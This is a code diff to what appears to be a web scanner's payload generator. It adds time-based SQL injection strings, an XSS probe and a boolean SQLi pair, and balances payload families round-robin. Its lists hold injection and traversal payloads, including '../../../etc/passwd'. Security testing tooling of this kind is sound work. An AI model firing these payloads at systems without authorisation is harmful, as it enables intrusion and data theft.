@@ -10,12 +10,15 @@ BASE_PAYLOADS = {
         "' OR '1'='1",
         "' OR '1'='1'--",
         "1' AND SLEEP(5)--",
+        "1;WAITFOR DELAY '0:0:5'--",
+        "1 OR pg_sleep(5)--",
         "\" OR \"1\"=\"1",
     ],
     "xss": [
         "<script>alert(1)</script>",
         "\"><img src=x onerror=alert(1)>",
         "<svg onload=alert(1)>",
+        "\"><svg/onload=alert('SENTINELXSS')>",
         "javascript:alert(1)",
     ],
     "path_traversal": [
@@ -68,18 +71,41 @@ def _mutate(payload: str) -> List[str]:
     return list(dict.fromkeys(variants))
 
 
+def sql_boolean_payload_pair() -> tuple[str, str]:
+    # Boolean-based payload pair used for differential SQLi checks.
+    return ("AND 1=1", "AND 1=2")
+
+
 def build_payloads(param_name: str, max_payloads: int) -> List[str]:
     families = _priority_families(param_name)
-    payloads: List[str] = []
+    family_payloads: List[List[str]] = []
     for family in families:
+        items: List[str] = []
         for base in BASE_PAYLOADS.get(family, []):
-            payloads.extend(_mutate(base))
+            items.extend(_mutate(base))
+        family_payloads.append(list(dict.fromkeys(items)))
 
-    # Add a few cross-family payloads for coverage.
-    payloads.extend(_mutate("' OR 1=1--"))
-    payloads.extend(_mutate("<img src=x onerror=alert(1)>"))
-    payloads.extend(_mutate("../../../etc/passwd"))
+    # Round-robin payload selection so one family does not starve others.
+    payloads: List[str] = []
+    idx = 0
+    while len(payloads) < max(1, max_payloads):
+        progressed = False
+        for items in family_payloads:
+            if idx < len(items):
+                payloads.append(items[idx])
+                progressed = True
+                if len(payloads) >= max(1, max_payloads):
+                    break
+        if not progressed:
+            break
+        idx += 1
+
+    if len(payloads) < max(1, max_payloads):
+        # Add a few cross-family payloads for coverage.
+        payloads.extend(_mutate("' OR 1=1--"))
+        payloads.extend(_mutate("1;WAITFOR DELAY '0:0:5'--"))
+        payloads.extend(_mutate("<img src=x onerror=alert(1)>"))
+        payloads.extend(_mutate("../../../etc/passwd"))
 
     deduped = list(dict.fromkeys(payloads))
     return deduped[: max(1, max_payloads)]
-
